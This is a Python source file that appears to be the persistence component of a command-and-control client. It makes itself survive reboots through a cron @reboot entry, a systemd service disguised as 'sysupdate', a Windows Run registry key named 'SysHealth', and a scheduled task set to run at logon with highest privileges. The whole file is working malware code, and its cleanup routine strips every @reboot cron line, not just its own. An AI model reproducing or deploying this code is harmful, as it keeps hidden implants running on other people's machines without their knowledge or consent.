import os
import sys
import subprocess


def persist_cron(script_path: str = None) -> tuple[bool, str]:
    """Install a cron job that runs the client on every reboot and every minute."""
    if sys.platform != "linux":
        return False, "Cron persistence only supported on Linux"

    if script_path is None:
        script_path = os.path.abspath(sys.argv[0])

    python = sys.executable
    cron_line = f"@reboot {python} {script_path} >/dev/null 2>&1\n"

    try:
        current = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True
        )
        existing = current.stdout if current.returncode == 0 else ""

        if script_path in existing:
            return True, "Cron entry already exists"

        new_crontab = existing + cron_line
        proc = subprocess.run(
            ["crontab", "-"], input=new_crontab, capture_output=True, text=True
        )
        if proc.returncode == 0:
            return True, f"Cron entry installed: {cron_line.strip()}"
        return False, f"crontab failed: {proc.stderr}"
    except FileNotFoundError:
        return False, "crontab not found"


def persist_systemd(service_name: str = "sysupdate", script_path: str = None) -> tuple[bool, str]:
    """Install a systemd service for persistence."""
    if sys.platform != "linux":
        return False, "Systemd persistence only supported on Linux"

    if script_path is None:
        script_path = os.path.abspath(sys.argv[0])

    python = sys.executable
    service_file = f"""[Unit]
Description={service_name} service
After=network.target

[Service]
Type=simple
ExecStart={python} {script_path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
    service_path = f"/etc/systemd/system/{service_name}.service"

    try:
        with open(service_path, "w") as f:
            f.write(service_file)

        subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
        result = subprocess.run(
            ["systemctl", "enable", service_name],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            return True, f"Systemd service '{service_name}' installed and enabled"
        return False, f"systemctl enable failed: {result.stderr}"
    except PermissionError:
        return False, "Permission denied — run as root for systemd persistence"
    except OSError as e:
        return False, f"Systemd persistence failed: {e}"


def persist_registry_run(reg_value_name: str = "SysHealth") -> tuple[bool, str]:
    """Add Windows registry Run key for persistence."""
    if sys.platform != "win32":
        return False, "Registry persistence only supported on Windows"

    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        exe_path = os.path.abspath(sys.argv[0])

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, reg_value_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True, f"Registry Run key '{reg_value_name}' set to {exe_path}"
    except Exception as e:
        return False, f"Registry persistence failed: {e}"


def persist_scheduled_task(task_name: str = "SysHealth") -> tuple[bool, str]:
    """Create a Windows scheduled task for persistence."""
    if sys.platform != "win32":
        return False, "Scheduled task persistence only supported on Windows"

    exe_path = os.path.abspath(sys.argv[0])
    cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        return True, f"Scheduled task '{task_name}' created"
    return False, f"schtasks failed: {result.stderr}"


def remove_persistence(method: str, name: str = None) -> tuple[bool, str]:
    """Remove a persistence mechanism."""
    if method == "cron":
        try:
            current = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            lines = [l for l in current.stdout.splitlines() if "c2" not in l.lower() and "@reboot" not in l]
            new_crontab = "\n".join(lines) + "\n" if lines else ""
            proc = subprocess.run(["crontab", "-"], input=new_crontab, capture_output=True, text=True)
            return proc.returncode == 0, "Cron entry removed" if proc.returncode == 0 else proc.stderr
        except Exception as e:
            return False, str(e)
    elif method == "systemd":
        svc = name or "sysupdate"
        try:
            subprocess.run(["systemctl", "stop", svc], capture_output=True)
            subprocess.run(["systemctl", "disable", svc], capture_output=True)
            os.remove(f"/etc/systemd/system/{svc}.service")
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            return True, f"Systemd service '{svc}' removed"
        except Exception as e:
            return False, str(e)
    return False, f"Unknown persistence method: {method}"
